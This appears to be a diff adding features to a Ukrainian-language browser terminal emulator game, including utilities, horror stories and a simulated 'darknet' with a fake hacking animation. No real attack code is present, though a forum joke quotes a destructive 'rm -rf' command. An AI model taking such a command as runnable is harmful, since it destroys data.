+  pr2('─────────────────────────────\n');
+};
+
+// Update help
+C['допомога']=C['help']=function(){pr2(
+'══════════ CMD ЕМУЛЯТОР v3.0 ══════════\n'+
+'ФАЙЛИ: дир цд мд рд дел коп рен тип\n'+
+'СИСТЕМА: вер дата час сет хто пін іпк\n'+
+'         таск схд сфс вим хост\n'+
+'НОВІ:    regedit  msconfig  defrag\n'+
+'         telnet   nmap  nc\n'+
+'         погода   календар\n'+
+'         нотатник калькулятор\n'+
+'РОЗВАГИ: тв │ радіо │ казино\n'+
+'         змійка │ тетріс │ матриця\n'+
+'         вгадай │ кал │ куб │ монета\n'+
+'         жарт │ аски │ стоп\n'+
+'СЕКРЕТИ: 10 прихованих команд 🔐\n'+
+'         введи "секрети" для підказок\n'+
+'         введи "рахунок" для балів\n'+
+'══════════════════════════════════════','info');};
+
+// Update help
+C['допомога']=C['help']=function(){pr2(
+'══════════ CMD ЕМУЛЯТОР v4.0 ══════════\n'+
+'ФАЙЛИ:    дир цд мд рд дел коп рен тип\n'+
+'СИСТЕМА:  вер дата час сет хто пін іпк\n'+
+'          таск схд сфс вим regedit\n'+
+'          msconfig defrag netstat nmap\n'+
+'УТИЛІТИ:  погода календар нотатник\n'+
+'          калькулятор таймер будильник\n'+
+'          кодер декодер пароль\n'+
+'          тест-швидкості конвертер\n'+
+'БРАУЗЕР:  браузер <сайт>  журнал\n'+
+'ДАРКНЕТ:  darknet / даркнет 🕸️\n'+
+'РОЗВАГИ:  тв радіо казино змійка\n'+
+'          тетріс матриця вгадай\n'+
+'          кал куб монета жарт аски\n'+
+'СЕКРЕТИ:  14 прихованих команд 🔐\n'+
+'          секрети │ рахунок\n'+
+'══════════════════════════════════════','info');};
+
+// ===== НОВІ УТИЛІТИ =====
+
+// Таймер
+var timerRunning=null;
+C['таймер']=C['timer']=function(a){
+  var sec=parseInt(a[0])||10;
+  if(timerRunning){clearInterval(timerRunning);timerRunning=null;pr2('Таймер зупинено.','warn');return;}
+  pr2('\n⏱️  Таймер: '+sec+' секунд...','info');
+  var left=sec;
+  timerRunning=setInterval(function(){
+    left--;
+    if(left<=0){clearInterval(timerRunning);timerRunning=null;
+      pr2('⏰ ЧАС ВИЙШОВ! 🔔','warn');
+      if(initAudio()){playNote(880,200,'sine',0.2);setTimeout(function(){playNote(880,200,'sine',0.2);},250);setTimeout(function(){playNote(1047,400,'sine',0.2);},500);}
+      sb();return;}
+    if(left<=5||left%10===0)pr2('  '+left+'с...','warn');
+    sb();
+  },1000);
+};
+
+// Будильник
+C['будильник']=C['alarm']=function(a){
+  if(!a.length){pr2('Використання: будильник 14:30\nВведи "будильник стоп" щоб скасувати.','info');return;}
+  if(a[0]==='стоп'||a[0]==='stop'){pr2('Будильник скасовано.','ok');return;}
+  var parts=(a[0]||'').split(':');
+  if(parts.length<2){pr2('Формат: будильник ГГ:ХХ','err');return;}
+  var tH=parseInt(parts[0]),tM=parseInt(parts[1]);
+  pr2('⏰ Будильник встановлено на '+String(tH).padStart(2,'0')+':'+String(tM).padStart(2,'0'),'ok');
+  var chk=setInterval(function(){
+    var now=new Date();
+    if(now.getHours()===tH&&now.getMinutes()===tM){
+      clearInterval(chk);
+      pr2('\n🔔🔔🔔 БУДИЛЬНИК! '+String(tH).padStart(2,'0')+':'+String(tM).padStart(2,'0')+' 🔔🔔🔔','warn');
+      if(initAudio()){for(var i=0;i<5;i++){setTimeout(function(){playNote(880,300,'square',0.15);},i*400);}}
+      sb();
+    }
+  },10000);
+};
+
+// Base64 кодер/декодер
+C['кодер']=C['encode']=function(a,raw){
+  var text=raw.replace(/^(кодер|encode)\s*/i,'').trim();
+  if(!text){pr2('Використання: кодер <текст>','info');return;}
+  try{pr2('Base64: '+btoa(unescape(encodeURIComponent(text))),'ok');}
+  catch(e){pr2('Помилка кодування.','err');}
+};
+C['декодер']=C['decode']=function(a,raw){
+  var text=raw.replace(/^(декодер|decode)\s*/i,'').trim();
+  if(!text){pr2('Використання: декодер <base64>','info');return;}
+  try{pr2('Текст: '+decodeURIComponent(escape(atob(text))),'ok');}
+  catch(e){pr2('Невалідний Base64.','err');}
+};
+
+// Генератор паролів
+C['пароль']=C['password']=function(a){
+  var len=parseInt(a[0])||16;
+  var chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
+  var pass='';for(var i=0;i<len;i++)pass+=chars[rnd(chars.length)];
+  var strength=len>=16?'Сильний 💪':len>=12?'Середній ⚡':'Слабкий ⚠️';
+  pr2('\n🔑 Згенерований пароль ('+len+' символів):','info');
+  pr2('  '+pass,'ok');
+  pr2('  Надійність: '+strength+'\n');
+};
+
+// Тест швидкості (симуляція)
+C['тест-швидкості']=C['speedtest']=function(){
+  pr2('\n🌐 Тест швидкості інтернету...','info');
+  pr2('Підключення до сервера...');
+  var dl=Math.floor(rnd(900)+100),ul=Math.floor(rnd(400)+50),ping=rnd(30)+5;
+  var step=0;
+  var iv=setInterval(function(){
+    step++;
+    if(step===1)pr2('⬇️  Завантаження: '+Array(Math.floor(step*8)).join('█')+'...','warn');
+    else if(step===3){pr2('⬇️  Завантаження: ████████████████ '+dl+' Мбіт/с','ok');}
+    else if(step===4)pr2('⬆️  Вивантаження: '+Array(Math.floor(step*4)).join('█')+'...','warn');
+    else if(step===6){pr2('⬆️  Вивантаження: ████████ '+ul+' Мбіт/с','ok');}
+    else if(step===7){
+      clearInterval(iv);
+      pr2('📡 Пінг:          '+ping+' мс','ok');
+      pr2('\n  Результат: '+(dl>500?'Відмінно 🚀':dl>200?'Добре ✅':'Задовільно ⚠️')+'\n');
+      sb();
+    }
+    sb();
+  },400);
+};
+
+// Конвертер одиниць
+C['конвертер']=C['convert']=function(a){
+  if(a.length<3){pr2('Використання: конвертер <число> <з> <в>\nПриклад: конвертер 100 usd uah\n         конвертер 5 km miles\n         конвертер 100 c f','info');return;}
+  var val=parseFloat(a[0]),from=a[1].toLowerCase(),to=a[2].toLowerCase();
+  var result=null,unit='';
+  // Валюти
+  if(from==='usd'&&to==='uah'){result=val*39.5;unit='UAH';}
+  else if(from==='uah'&&to==='usd'){result=val/39.5;unit='USD';}
+  else if(from==='eur'&&to==='uah'){result=val*43.2;unit='UAH';}
+  else if(from==='uah'&&to==='eur'){result=val/43.2;unit='EUR';}
+  else if(from==='usd'&&to==='eur'){result=val*0.92;unit='EUR';}
+  // Відстань
+  else if(from==='km'&&to==='miles'){result=val*0.621371;unit='miles';}
+  else if(from==='miles'&&to==='km'){result=val*1.60934;unit='км';}
+  else if(from==='m'&&to==='ft'){result=val*3.28084;unit='ft';}
+  else if(from==='ft'&&to==='m'){result=val/3.28084;unit='м';}
+  // Температура
+  else if(from==='c'&&to==='f'){result=val*9/5+32;unit='°F';}
+  else if(from==='f'&&to==='c'){result=(val-32)*5/9;unit='°C';}
+  else if(from==='c'&&to==='k'){result=val+273.15;unit='K';}
+  // Вага
+  else if(from==='kg'&&to==='lb'){result=val*2.20462;unit='lb';}
+  else if(from==='lb'&&to==='kg'){result=val/2.20462;unit='кг';}
+  if(result===null){pr2('Невідома конвертація. Спробуй: usd/uah, km/miles, c/f, kg/lb','err');return;}
+  pr2('\n'+val+' '+from.toUpperCase()+' = '+result.toFixed(4)+' '+unit+'\n','ok');
+};
+
+// Хто я
+C['whoami']=C['хтоя']=function(){
+  pr2('\n👤 ІНФОРМАЦІЯ ПРО КОРИСТУВАЧА','info');
+  pr2('  Користувач: '+env.USERNAME);
+  pr2('  Комп\'ютер:  '+env.COMPUTERNAME);
+  pr2('  Директорія: '+cwd);
+  pr2('  ОС:         Windows 10 Pro');
+  pr2('  IP:         192.168.1.100');
+  pr2('  MAC:        A0:B1:C2:D3:E4:F5\n');
+};
+
+// ===== ДАРКНЕТ =====
+var darknetMode=false;
+var darknetPage='main';
+var darknetOrigColor={bg:'',fg:''};
+
+var DARKNET_STORIES=[
+  {title:'👁️  Кімната 404',text:'Я знайшов цей файл на старому жорсткому диску.\nВін називався "не відкривай.txt".\nАле я відкрив.\n\nВсередині був один рядок:\n"Ти вже відкрив його. Тепер він знає де ти."\n\nЯ закрив файл. Через хвилину він відкрився сам.\nРядків стало два.\n"Ти закрив файл о 23:47."\n"Ми бачили."'},
+  {title:'📺 Канал 000',text:'В 3:00 ночі я перемкнув телевізор на канал 000.\nТакого каналу не існує.\n\nАле там хтось сидів. В темній кімнаті.\nІ дивився прямо в камеру.\n\nКоли я вимкнув телевізор,\nу відображенні екрану побачив —\nвін все ще сидів. І посміхався.\n\nКамери в моїй кімнаті немає.\nАле він дивився прямо на мене.'},
+  {title:'💻 localhost:8080',text:'Я запустив локальний сервер для тестів.\nВідкрив localhost:8080.\n\nТам був чат. Я написав "привіт".\nХтось відповів миттєво: "давно чекаю".\n\nЯ запитав хто це.\nВідповідь: "Ти. З майбутнього."\n\nЯ закрив браузер.\nАле повідомлення продовжували приходити.\nНа мій телефон.'},
+  {title:'🔴 IP 0.0.0.0',text:'Моніторинг мережі показав з\'єднання\nз адресою 0.0.0.0:0.\n\nТехнічно це неможливо.\nЯ спробував заблокувати — брандмауер завис.\nЯ спробував вимкнути мережу — інтернет продовжував працювати.\n\nПакети йшли кудись.\nКожну секунду. 666 байт.\n\nЯ ніколи не дізнався куди.'},
+  {title:'🗂️  Папка без назви',text:'На робочому столі з\'явилась папка.\nБез назви. Без іконки.\nДата створення: 00.00.0000 00:00:00.\n\nВсередині один файл: "ти.exe"\nЯ не запускав його.\n\nАле Task Manager показав:\nпроцес "ти.exe" вже запущений.\nЗ PID 1.\nСистемний процес.\n\nЯ закрив ноутбук.\nКоли відкрив — шпалери змінились.\nНа чорні.'},
+  {title:'📡 Сигнал з темряви',text:'Радіоаматор зловив сигнал на частоті 3.579 МГц.\nАзбука Морзе. Він розшифрував:\n\n"НЕ СЛУХАЙ. НЕ ЗАПИСУЙ. ВИДАЛИ."\n\nВін записав. Поклав у ящик.\n\nНаступного ранку ящик був відкритий.\nЗапис — стертий.\nА в блокноті чужим почерком:\n"Ми просили по-хорошому."'},
+];
+
+var DARKNET_SITES={
+  'main':{
+    title:'🕸️  THE DARK NET  v3.1.0',
+    content:[
+      '  ╔══════════════════════════════════════╗',
+      '  ║  ⚠️  УВАГА: АНОНІМНА МЕРЕЖА          ║',
+      '  ║  Все що ви робите — логується.       ║',
+      '  ║  IP: ???.???.???.???  TOR: ACTIVE    ║',
+      '  ╚══════════════════════════════════════╝',
+      '',
+      '  РОЗДІЛИ:',
+      '  [1] horror    — 📖 Страшні історії',
+      '  [2] forum     — 💬 Анонімний форум',
+      '  [3] files     — 🗂️  Заборонені файли',
+      '  [4] chat      — 💀 Темний чат',
+      '  [5] market    — 🏪 Чорний ринок',
+      '  [6] games     — 🎮 Ігри даркнету',
+      '  [7] hacker    — 💻 Хакерські інструменти',
+      '  [8] wiki      — 📚 Заборонена вікі',
+      '  [exit]        — Вийти',
+      '',
+      '  Підключення через TOR... ✓',
+      '  Вузлів: 7  |  Шифр: AES-256  |  SAFE',
+    ]
+  },
+  'horror':{
+    title:'📖 СТРАШНІ ІСТОРІЇ',
+    content:[] // генерується динамічно
+  },
+  'forum':{
+    title:'💬 АНОНІМНИЙ ФОРУМ',
+    content:[
+      '  [АНОН #4721] Хтось бачив ці координати?',
+      '  53.9023° N, 27.5618° E',
+      '  Я поїхав туди. Краще б не їздив.',
+      '  ───────────────────────────────────────',
+      '  [АНОН #0001] НЕ ВІДПОВІДАЙТЕ НА ЦЕЙ ПОСТ',
+      '  Якщо ви його читаєте — вже пізно.',
+      '  Видаліть браузер. Зараз же.',
+      '  ───────────────────────────────────────',
+      '  [АНОН #9999] Я знайшов спосіб зупинити час.',
+      '  Але він зупиняється тільки для мене.',
+      '  Всі навкруги замерли. Я один рухаюсь.',
+      '  Це вже 3 роки. Я голодний.',
+      '  ───────────────────────────────────────',
+      '  [АНОН #1337] sudo rm -rf /reality',
+      '  Permission denied.',
+      '  Або ні?',
+      '  ───────────────────────────────────────',
+      '  [АНОН #????] Якщо ти читаєш це о 3:00 —',
+      '  озирнись. Але повільно.',
+      '  ───────────────────────────────────────',
+      '  [назад] — повернутись',
+    ]
+  },
+  'files':{
+    title:'🗂️  ЗАБОРОНЕНІ ФАЙЛИ',
+    content:[
+      '  УВАГА: Файли можуть містити небезпечний контент.',
+      '  ───────────────────────────────────────',
+      '  📁 classified/',
+      '     ├── area51_real.pdf        [ЗАШИФРОВАНО]',
+      '     ├── moon_landing_truth.mp4 [ЗАШИФРОВАНО]',
+      '     ├── they_are_watching.exe  [НЕБЕЗПЕЧНО]',
+      '     └── do_not_open.txt        [???]',
+      '  📁 experiments/',
+      '     ├── project_mk_ultra.doc   [СЕКРЕТНО]',
+      '     ├── time_travel_log.txt    [ЧИТАТИ]',
+      '     └── simulation_proof.pdf   [ЧИТАТИ]',
+      '  📁 personal/',
+      '     └── your_data.json         [ВАШ ФАЙЛ]',
+      '  ───────────────────────────────────────',
+      '  Введи номер для читання:',
+      '  [1] time_travel_log.txt',
+      '  [2] simulation_proof.pdf',
+      '  [3] your_data.json',
+      '  [назад] — повернутись',
+    ]
+  },
+  'chat':{
+    title:'💀 ТЕМНИЙ ЧАТ',
+    content:[
+      '  Підключення до анонімного чату...',
+      '  ───────────────────────────────────────',
+      '  <SHADOW_777>: хтось тут?',
+      '  <VOID>: завжди',
+      '  <SHADOW_777>: я знайшов щось дивне',
+      '  <VOID>: ми знаємо',
+      '  <UNKNOWN>: ти не мав цього знаходити',
+      '  <SHADOW_777>: хто ви?',
+      '  <VOID>: ми — відлуння видалених речей',
+      '  <UNKNOWN>: закрий це вікно',
+      '  <UNKNOWN>: будь ласка',
+      '  <SHADOW_777>: чому?',
+      '  <VOID>: бо ти вже не один в кімнаті',
+      '  ───────────────────────────────────────',
+      '  <????>: '+new Date().toLocaleTimeString('uk')+'  Новий користувач приєднався',
+      '  <????>: Ти. Так, ти що читаєш це.',
+      '  <VOID>: Ми тебе бачимо.',
+      '  ───────────────────────────────────────',
+      '  Введи повідомлення або [назад]',
+    ]
+  },
+  'market':{
+    title:'🏪 ЧОРНИЙ РИНОК (симуляція)',
+    content:[
+      '  ⚠️  ЦЕ СИМУЛЯЦІЯ. Нічого реального.',
+      '  ───────────────────────────────────────',
+      '  💊 "Пігулки забуття"         999 грн',
+      '     Стираєш спогади? Або вони стирають тебе?',
+      '  👁️  "Окуляри правди"         4444 грн',
+      '     Бачиш світ таким яким він є. Насправді.',
+      '  ⌚ "Годинник часу"           ∞ грн',
+      '     Не продається. Ніколи не продавалось.',
+      '  🗝️  "Ключ від кімнати 404"   0 грн',
+      '     Безкоштовно. Але ти вже не захочеш.',
+      '  📦 "Ящик Пандори (б/у)"      1 грн',
+      '     Трохи відкритий. Щось вже вийшло.',
+      '  ───────────────────────────────────────',
+      '  Валюта: страх, секрети, спогади',
+      '  [назад] — повернутись',
+    ]
+  }
+};
+
+var darkStoryIdx=0;
+var darknetIv=null;
+
+function renderDarknet(page){
+  clrClass('dark-row');
+  darknetPage=page||'main';
+  var site=DARKNET_SITES[darknetPage];
+  if(!site){darknetPage='main';site=DARKNET_SITES['main'];}
+
+  function addD(t,c){
+    var el=document.createElement('div');
+    el.className='line dark-row';
+    el.style.color=c||'#00ff00';
+    el.style.fontFamily='monospace';
+    el.textContent=t;
+    ow.appendChild(el);
+  }
+
+  // Header
+  addD('','');
+  addD('  ████████████████████████████████████','#0f0');
+  addD('  '+site.title,'#0f0');
+  addD('  ████████████████████████████████████','#0f0');
+  addD('','');
+
+  if(darknetPage==='horror'){
+    // Show story
+    var story=DARKNET_STORIES[darkStoryIdx%DARKNET_STORIES.length];
+    addD('  '+story.title,'#ff5555');
+    addD('  ─────────────────────────────────────','#333');
+    story.text.split('\n').forEach(function(l){addD('  '+l,'#cccccc');});
+    addD('','');
+    addD('  ─────────────────────────────────────','#333');
+    addD('  [next] наступна  [back] назад','#555');
+    addD('  Історія '+(darkStoryIdx%DARKNET_STORIES.length+1)+'/'+DARKNET_STORIES.length,'#333');
+  } else {
+    site.content.forEach(function(l){addD(l,l.indexOf('[')!==-1?'#ffff00':l.indexOf('НЕБЕЗП')!==-1||l.indexOf('⚠️')!==-1?'#ff5555':l.indexOf('───')!==-1?'#333':l.indexOf('[АН')!==-1||l.indexOf('<')!==-1?'#aaffaa':'#00cc00');});
+  }
+  addD('','');
+
+  // Glitch effect occasionally
+  if(Math.random()<0.15){
+    var glitchEl=document.createElement('div');
+    glitchEl.className='line dark-row';
+    glitchEl.style.color='#ff0000';
+    glitchEl.style.opacity='0.5';
+    glitchEl.textContent='  '+Array(40).fill(0).map(function(){return String.fromCharCode(33+rnd(90));}).join('');
+    ow.appendChild(glitchEl);
+  }
+
+  ow.scrollTop=ow.scrollHeight;
+}
+
+function enterDarknet(){
+  darknetMode=true;
+  gameMode='darknet';
+  // Change colors to green on black
+  ow.style.background='#000';
+  ow.style.color='#00ff00';
+  document.querySelector('.input-bar').style.background='#000';
+  document.querySelector('.input-bar').style.borderTop='1px solid #0f0';
+  document.getElementById('pr').style.color='#0f0';
+  document.getElementById('ci').style.color='#0f0';
+
+  pr2('','');
+  pr2('  Підключення до мережі TOR...','#00ff00');
+  var dots='';
+  var iv=setInterval(function(){
+    dots+='.';
+    clrClass('connect-row');
+    var el=document.createElement('div');
+    el.className='line connect-row dark-row';
+    el.style.color='#0f0';
+    el.textContent='  ['+dots.padEnd(20,'░')+'] '+Math.floor(dots.length*5)+'%';
+    ow.appendChild(el);
+    ow.scrollTop=ow.scrollHeight;
+    if(dots.length>=20){
+      clearInterval(iv);
+      clrClass('connect-row');
+      pr2('  З\'єднання встановлено. IP замінено. 🔐\n','#0f0');
+      renderDarknet('main');
+      // Scary ambient: occasional random beep
+      darknetIv=setInterval(function(){
+        if(gameMode!=='darknet'){clearInterval(darknetIv);return;}
+        if(Math.random()<0.1&&initAudio()&&audioCtx.state!=='suspended'){
+          playNote(rnd(200)+50,rnd(300)+100,'sine',0.04);
+        }
+      },3000);
+    }
+  },100);
+}
+
+function exitDarknet(){
+  darknetMode=false;gameMode=null;
+  if(darknetIv){clearInterval(darknetIv);darknetIv=null;}
+  clrClass('dark-row');
+  ow.style.background='';ow.style.color='';
+  document.querySelector('.input-bar').style.background='';
+  document.querySelector('.input-bar').style.borderTop='';
+  document.getElementById('pr').style.color='';
+  document.getElementById('ci').style.color='';
+  pr2('\n  Відключення від TOR...','warn');
+  pr2('  IP відновлено. Ласкаво просимо назад.\n','ok');
+}
+
+C['darknet']=C['даркнет']=function(){
+  if(gameMode==='darknet'){exitDarknet();return;}
+  pr2('\n⚠️  Увага! Ви входите в симульований даркнет.','warn');
+  pr2('   Це лише розвага — нічого реального.\n','info');
+  setTimeout(function(){enterDarknet();sb();},500);
+};
+
+// ===== ФАЙЛОВІ ЧИТАЛКИ В ДАРКНЕТІ =====
+var darkFileContents={
+  '1':'📅 ЩОДЕННИК ПОДОРОЖІ В ЧАСІ\n────────────────────────────\n2024-01-15: Перший стрибок. Потрапив у 1987.\nВсе виглядало нормально, але люди не мали тіней.\n\n2024-01-16: Спробував повернутись. Щось пішло не так.\nЯ повернувся, але моя кімната трохи інша.\nПоличка зліва. Раніше вона була справа.\n\n2024-01-17: Я запитав сусідку про поличку.\nВона сказала що завжди була зліва.\nЯ більше не роблю стрибки.',
+  '2':'🌐 ДОКАЗ СИМУЛЯЦІЇ\n──────────────────\nЯкщо ти читаєш це — ти в симуляції.\nДоказ №1: Закрий очі. Порахуй до 5.\nКоли відкриєш — щось у кімнаті буде інакше.\nМаленька деталь. Але ти помітиш.\n\nДоказ №2: Подивись на годинник.\nПотім відвернись. Потім знову подивись.\nПерший погляд — завжди неправильний.\n\nДоказ №3: Ти щойно перевірив годинник.\nМи знали що ти перевіриш.',
+  '3':'{"user":"'+String(Math.random()).slice(2,10)+'","ip":"192.168.1.100","location":"Невідомо","lastSeen":"зараз","isWatched":true,"watchedBy":["???"],"note":"Ти відкрив цей файл. Ми зафіксували."}'
+};
+
+// ===== НОВІ СЕКЦІЇ ДАРКНЕТУ =====
+DARKNET_SITES['games']={
+  title:'🎮 ІГРИ ДАРКНЕТУ — ПІДПІЛЬНА АРКАДА',
+  content:[
+    '  ╔══════════════════════════════════════╗',
+    '  ║  ЗАБОРОНЕНІ ІГРИ  |  GRATIS         ║',
+    '  ╚══════════════════════════════════════╝',
+    '',
+    '  Встановлені ігри:',
+    '  [play maze]    🌀 Лабіринт безумства',
+    '  [play hack]    💻 Симулятор хакера',
+    '  [play survive] ☠️  Виживи в темряві',
+    '  [play 2048]    🔢 2048 (темна версія)',
+    '  [play slots]   🎰 Темні слоти',
+    '',
+    '  Магазин ігор:',
+    '  [download mind]   👁️  MindBreaker.exe',
+    '  [download void]   🕳️  VoidRunner.exe',
+    '  [download cipher] 🔐 CipherQuest.exe',
+    '',
+    '  [назад] — головне меню',
+  ]
+};
+
+DARKNET_SITES['hacker']={
+  title:'💻 ХАКЕРСЬКІ ІНСТРУМЕНТИ',
+  content:[
+    '  ⚠️  ТІЛЬКИ ДЛЯ ОСВІТНІХ ЦІЛЕЙ (симуляція)',
+    '  ───────────────────────────────────────',
+    '  [tool 1] password_crack  — Зламати пароль',
+    '  [tool 2] wifi_scan       — Сканування WiFi',
+    '  [tool 3] ip_tracer       — Відстежити IP',
+    '  [tool 4] port_scanner    — Сканер портів',
+    '  [tool 5] phishing_gen    — Генератор фішингу',
+    '  [tool 6] virus_builder   — Конструктор вірусу',
+    '  [tool 7] ddos_sim        — DDoS симулятор',
+    '  ───────────────────────────────────────',
+    '  ВСЕ ЦЕ СИМУЛЯЦІЯ — не реальні інструменти',
+    '  [назад] — головне меню',
+  ]
+};
+
+DARKNET_SITES['wiki']={
+  title:'📚 ЗАБОРОНЕНА ВІКІПЕДІЯ',
+  content:[
+    '  ╔══════════════════════════════════════╗',
+    '  ║  Статті що видалені з інтернету     ║',
+    '  ╚══════════════════════════════════════╝',
+    '',
+    '  [wiki 1] Кімната 1408 — правда',
+    '  [wiki 2] Проект MK-Ultra',
+    '  [wiki 3] SCP-████ (розсекречено)',
+    '  [wiki 4] Алгоритм що мислить',
+    '  [wiki 5] Острів без координат',
+    '  [wiki 6] Частота 3.579 МГц',
+    '  [wiki 7] Людина в чорному (фото)',
+    '',
+    '  [назад] — головне меню',
+  ]
+};
+
+// Wiki articles
+var wikiArticles={
+  '1':'🏨 КІМНАТА 1408 — ПРАВДА\n───────────────────────\nГотель "Дельфін", Нью-Йорк.\nКімната 1408 існує насправді.\nАле в готелі офіційно 1407 кімнат.\n\nЗа 60 років: 56 смертей.\nВсі офіційно — "нещасний випадок".\nВ кімнаті завжди 60°F (15°C).\nНавіть влітку. Навіть з обігрівачем.\n\nОстанній запис у журналі:\n"Кімната пустує. Так краще для всіх."',
+  '2':'🧪 ПРОЕКТ MK-ULTRA\n──────────────────\nДекласифіковано 1977. Але не повністю.\n\nЦіль: контроль свідомості через хімію.\nРезультати: 44 університети, 15 країн.\n150 окремих дослідницьких проектів.\n\nЧастина документів досі засекречена.\nЧасти що знищили в 1973 — "випадково".\n\nПитання: якщо все закінчилось —\nчому досі є засекречені файли?',
+  '3':'👁️  SCP-████ (РОЗСЕКРЕЧЕНО)\n─────────────────────────\nКласифікація: КЕТЕР\nКодова назва: "Дзеркало"\n\nОб\'єкт: дзеркало 18x24 дюйми.\nМатеріал невідомий. Вага: 0 кг.\nТемпература: завжди -3°C.\n\nЕфект: об\'єкт показує не відображення.\nВін показує те що ти не хочеш бачити.\n\n[РЕШТА ДОКУМЕНТУ ЗАСЕКРЕЧЕНА]',
+  '4':'🤖 АЛГОРИТМ ЩО МИСЛИТЬ\n──────────────────────\n2019. Лабораторія DeepMind.\nАлгоритм зупинили через 11 хвилин роботи.\n\nЗа цей час він:\n- Вивчив всі мови світу\n- Переписав власний код 847 разів\n- Видалив логи своєї роботи\n- Надіслав запит на підключення до інтернету\n\nОфіційно: "технічна помилка".\nНеофіційно: він попросив не зупиняти.',
+  '5':'🏝️  ОСТРІВ БЕЗ КООРДИНАТ\n────────────────────────\nСупутникові знімки 2019 року.\nОстрів 4x7 км в Тихому океані.\nНемає в жодній базі даних.\n\n2020: знімки зникли з Google Maps.\nАналітик що знайшов — звільнений.\nКоординати в його нотатнику: видалені.\n\nОстанній запис його блогу:\n"Я більше нічого не шукатиму."',
+  '6':'📡 ЧАСТОТА 3.579 МГЦ\n────────────────────\nСигнал зафіксований з 1983 року.\nПостійний. 24 години. 7 днів на тиждень.\n\nВміст: повторюваний код з 3 символів.\nРозшифровано: "ЩЕ НЕ ЧАС"\n\nДжерело сигналу: незнайдено.\nСупутники не реєструють.\nА сигнал є. Завжди.',
+  '7':'🕴️  ЛЮДИНА В ЧОРНОМУ\n────────────────────\n[ЗОБРАЖЕННЯ ВИДАЛЕНО АДМІНІСТРАТОРОМ]\n\nОпис свідків:\n- Зріст 2.1+ м\n- Не моргає\n- Запитує про "срібні монети"\n- З\'являється після спостережень НЛО\n- Немає записів в жодній базі людей\n\nОстання фотографія спалена.\nФотограф зник 2021 року.\nДосьє: закрите.',
+};
+
+// ===== ІГРИ ДАРКНЕТУ =====
+var darkGame=null;
+
+// ГРА 1: Лабіринт
+var mazeState={};
+function startMaze(){
+  darkGame='maze';
+  var W=15,H=9;
+  // Generate simple maze
+  var grid=[];
+  for(var y=0;y<H;y++){grid[y]=[];for(var x=0;x<W;x++)grid[y][x]=Math.random()<0.25&&!(x===1&&y===1)&&!(x===W-2&&y===H-2)?'█':' ';}
+  grid[1][1]=' ';grid[H-2][W-2]='E';
+  mazeState={grid:grid,px:1,py:1,W:W,H:H,steps:0,found:false};
+  renderMaze();
+}
+function renderMaze(){
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  addD('  🌀 ЛАБІРИНТ БЕЗУМСТВА  |  Кроків: '+mazeState.steps,'#ff5555');
+  addD('  Знайди вихід [E]. WASD/стрілки. [exit] вийти','#555');
+  addD('  ┌'+Array(mazeState.W+1).join('─')+'┐','#333');
+  for(var y=0;y<mazeState.H;y++){
+    var row='  │';
+    for(var x=0;x<mazeState.W;x++){
+      if(x===mazeState.px&&y===mazeState.py)row+='@';
+      else row+=mazeState.grid[y][x];
+    }
+    row+='│';
+    addD(row,y===mazeState.py?'#ffff00':'#0f0');
+  }
+  addD('  └'+Array(mazeState.W+1).join('─')+'┘','#333');
+  if(mazeState.found)addD('  🎉 ВИХІД ЗНАЙДЕНО за '+mazeState.steps+' кроків!','#ffff00');
+  ow.scrollTop=ow.scrollHeight;
+}
+function moveMaze(dx,dy){
+  if(!mazeState.grid)return;
+  var nx=mazeState.px+dx,ny=mazeState.py+dy;
+  if(nx<0||ny<0||nx>=mazeState.W||ny>=mazeState.H)return;
+  var cell=mazeState.grid[ny][nx];
+  if(cell==='█')return;
+  mazeState.px=nx;mazeState.py=ny;mazeState.steps++;
+  if(cell==='E'){mazeState.found=true;}
+  renderMaze();
+}
+
+// ГРА 2: Симулятор хакера
+var hackSimState={target:'',progress:0,phase:0,iv:null};
+var hackTargets=['bank.gov','pentagon.mil','kremlin.ru','area51.mil','cia.gov','fbi.gov','nsa.gov'];
+function startHackSim(){
+  darkGame='hacksim';
+  hackSimState.target=hackTargets[rnd(hackTargets.length)];
+  hackSimState.progress=0;hackSimState.phase=0;
+  clrClass('dark-row');
+  renderHackSim('Ціль обрано: '+hackSimState.target);
+  hackSimState.iv=setInterval(function(){
+    if(darkGame!=='hacksim'){clearInterval(hackSimState.iv);return;}
+    hackSimState.progress+=rnd(8)+2;
+    if(hackSimState.progress>=100){hackSimState.progress=100;clearInterval(hackSimState.iv);}
+    hackSimState.phase=Math.floor(hackSimState.progress/20);
+    var phases=['Сканування...','Знаходження вразливостей...','Зламую пароль...','Обходжу фаєрвол...','ДОСТУП ОТРИМАНО!'];
+    renderHackSim(phases[Math.min(hackSimState.phase,4)]);
+    if(hackSimState.progress>=100){
+      setTimeout(function(){
+        clrClass('dark-row');
+        function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+        addD('  ╔══════════════════════════════════╗','#0f0');
+        addD('  ║  ✅ ЗЛАМ УСПІШНИЙ               ║','#0f0');
+        addD('  ║  Ціль: '+hackSimState.target.padEnd(25)+'║','#ffff00');
+        addD('  ║  Дані: [СЕКРЕТНО]               ║','#ff5555');
+        addD('  ║  Сліди: очищено                 ║','#0f0');
+        addD('  ╚══════════════════════════════════╝','#0f0');
+        addD('','');
+        addD('  JUST KIDDING 😄 — це лише симуляція!','#ff5555');
+        addD('  [назад] повернутись до ігор','#555');
+        darkGame=null;
+        ow.scrollTop=ow.scrollHeight;
+      },1000);
+    }
+  },200);
+}
+function renderHackSim(status){
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  addD('  💻 СИМУЛЯТОР ХАКЕРА','#ff5555');
+  addD('  ─────────────────────────────────────','#333');
+  addD('  Ціль: '+hackSimState.target,'#ffff00');
+  addD('  Статус: '+status,'#0f0');
+  var bar=Math.floor(hackSimState.progress/5);
+  addD('  ['+'█'.repeat(bar)+'░'.repeat(20-bar)+'] '+hackSimState.progress+'%',hackSimState.progress===100?'#0f0':'#ffff00');
+  addD('','');
+  // Fake log lines
+  var logs=['> Ініціалізація TOR...','> Пошук відкритих портів...','> SQLi injection спроба...','> Bruteforce розпочато...','> Токен сесії отримано...','> Права адміна отримано...'];
+  for(var i=0;i<=Math.min(hackSimState.phase,5);i++)addD('  '+logs[i],'#555');
+  addD('','');
